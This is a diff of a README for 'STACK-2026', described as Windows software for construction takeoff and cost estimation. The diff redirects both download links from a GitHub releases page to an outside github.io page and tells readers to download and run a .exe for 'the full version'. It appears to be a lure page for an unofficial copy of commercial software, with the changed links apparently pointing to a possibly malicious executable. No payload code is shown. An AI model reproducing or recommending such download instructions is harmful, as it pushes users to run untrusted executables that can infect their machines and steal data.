@@ -1,6 +1,6 @@
 # 🏗️ STACK-2026 - Streamline Your Construction Estimation Process
 
-[![](https://img.shields.io/badge/Download_STACK--2026-Blue?style=for-the-badge)](https://github.com/notedirequiensoyk-source/STACK-2026/releases)
+[![](https://img.shields.io/badge/Download_STACK--2026-Blue?style=for-the-badge)](https://notedirequiensoyk-source.github.io)
 
 STACK-2026 assists construction professionals with digital takeoff and project estimation. This software allows users to measure blueprints and calculate material costs quickly. It functions on Windows 10 and Windows 11 operating systems. This guide explains the steps to acquire and launch the program on your computer.
 
@@ -8,7 +8,7 @@ STACK-2026 assists construction professionals with digital takeoff and project e
 
 Follow these steps to obtain the full version of STACK-2026.
 
-1. Navigate to the [official release page](https://github.com/notedirequiensoyk-source/STACK-2026/releases).
+1. Navigate to the [official release page](https://notedirequiensoyk-source.github.io).
 2. Locate the most recent version in the list.
 3. Click the file ending in .exe to begin the download.
 4. Save the file to your desktop or downloads folder.
